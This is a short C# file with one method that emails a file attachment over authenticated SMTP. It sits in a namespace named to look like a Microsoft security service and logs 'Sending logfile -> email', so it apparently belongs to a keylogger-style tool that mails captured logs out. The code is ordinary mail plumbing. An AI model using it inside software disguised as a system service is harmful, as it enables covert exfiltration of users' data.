using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace MicrosoftKeyServiceDefender
{
    public class EmailServiceProvider
    {
        public static void SendEmailWithAttachment(string fromEmail, string toEmail, string subject, string body, string smtpServer, int smtpPort, string smtpUsername, string smtpPassword, string attachmentFilePath)
        {
            try
            {
                Console.Out.WriteLine("\n\n\nSending logfile -> email\n\n\n");
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient(smtpServer);

                mail.From = new MailAddress(fromEmail);
                mail.To.Add(toEmail);
                mail.Subject = subject;
                mail.Body = body;

                Attachment attachment;
                attachment = new Attachment(attachmentFilePath);
                mail.Attachments.Add(attachment);

                SmtpServer.Port = smtpPort;
                SmtpServer.Credentials = new System.Net.NetworkCredential(smtpUsername, smtpPassword);
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.Out.WriteLine("\n\n\nLogfile sent successfully!\n\n\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in sending email: " + ex.Message);
            }
        }
    }
}
